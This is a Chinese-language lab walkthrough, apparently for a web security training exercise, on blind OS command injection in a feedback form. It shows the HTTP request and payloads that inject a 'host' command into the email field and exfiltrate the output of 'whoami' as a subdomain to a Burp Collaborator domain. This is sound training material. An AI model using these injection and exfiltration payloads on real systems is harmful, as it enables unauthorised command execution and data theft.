# 实验：具有带外数据窃取的盲注 OS 命令注入

本实验在反馈功能中包含一个盲注操作系统命令注入漏洞。

应用程序执行一个包含用户提供的详细信息的 shell 命令。该命令是异步执行的，对应用程序的响应没有影响。无法将输出重定向到你可以访问的位置。但是，你可以触发与外部域名的带外交互。

为了解决本实验，请执行 `whoami` 命令并通过向 Burp Collaborator 发起 DNS 查询来窃取输出。你需要输入当前用户的名称以完成本实验。

> **注意**
> 为了防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。为了解决本实验，你必须使用 Burp Collaborator 的默认公共服务器。

## 步骤

探测
- 使用反馈功能

    ```http
    POST /feedback/submit HTTP/2

    csrf=51QjZCnppCwEVODN29FtQePhZv4EWhoM&name=a&email=a%40b&subject=c&message=d
    ```

- 测试带外载荷
    ```
    csrf=51QjZCnppCwEVODN29FtQePhZv4EWhoM&name=a&email=a%40b<@urlencode>;host zru178qrfmha7teg1mzmjjknjep5dw1l.oastify.com;</@urlencode>&subject=c&message=d
    ```
    - email 字段得到 DNS 查询

带外获取命令结果
- 使用命令结果作为子域名
    ```sh
    ;host `whoami`.zru178qrfmha7teg1mzmjjknjep5dw1l.oastify.com;
    ```
    - 得到命令结果作为子域名
